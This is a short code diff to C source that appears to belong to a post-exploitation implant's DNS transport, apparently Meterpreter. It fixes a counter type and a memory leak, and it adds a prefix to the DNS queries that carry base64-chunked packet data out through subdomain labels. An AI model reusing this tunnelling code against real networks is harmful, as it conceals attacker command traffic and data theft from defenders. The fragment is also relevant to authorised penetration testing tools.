@@ -28,7 +28,7 @@ DWORD WINAPI ThreadProc(DNSThreadParams *lpParam) {
     int cur_idx = lpParam->index;
     //ReleaseMutex(lpParam->mutex);
     
-    USHORT current_recieved = 0;
+    UINT current_recieved = 0;
     
     request = (wchar_t *)calloc(250, sizeof(wchar_t));
     result_iter = (PDNS_RECORD)calloc(1, sizeof(DNS_RECORD));
@@ -526,14 +526,15 @@ static DWORD packet_transmit_dns(Remote *remote, Packet *packet, PacketRequestCo
     if (force_stop == TRUE){
 
         do {
-
+            if (request!=NULL) SAFE_FREE(request);
+             
             _itow_s(*counter, sub_c, 6, 10);
 
             force_next = FALSE;
             force_stop = FALSE;
 
             request = (wchar_t *)calloc(MAX_DNS_NAME_SIZE + 1, sizeof(wchar_t));
-            rest_len = MAX_DNS_NAME_SIZE - wcslen(domain) - 5 - wcslen(sub_c);
+            rest_len = MAX_DNS_NAME_SIZE - wcslen(domain) - 7 - wcslen(sub_c);
             rest_len = min(rest_len, need_to_send - current_sent);
             parts = rest_len / (MAX_DNS_SUBNAME_SIZE + 1);
             parts_last = rest_len % (MAX_DNS_SUBNAME_SIZE + 1);
@@ -542,7 +543,11 @@ static DWORD packet_transmit_dns(Remote *remote, Packet *packet, PacketRequestCo
             DWORD i = 0;
             DWORD shift2 = current_sent;
             shift = 0;
+            
+            wcsncat_s(request, MAX_DNS_NAME_SIZE,L"t.",2);
+            
             for (; i < parts; i++){
+                
                 wcsncat_s(request, MAX_DNS_NAME_SIZE, base64 + shift2, MAX_DNS_SUBNAME_SIZE);
                 shift += MAX_DNS_SUBNAME_SIZE;
                 shift2 += MAX_DNS_SUBNAME_SIZE;
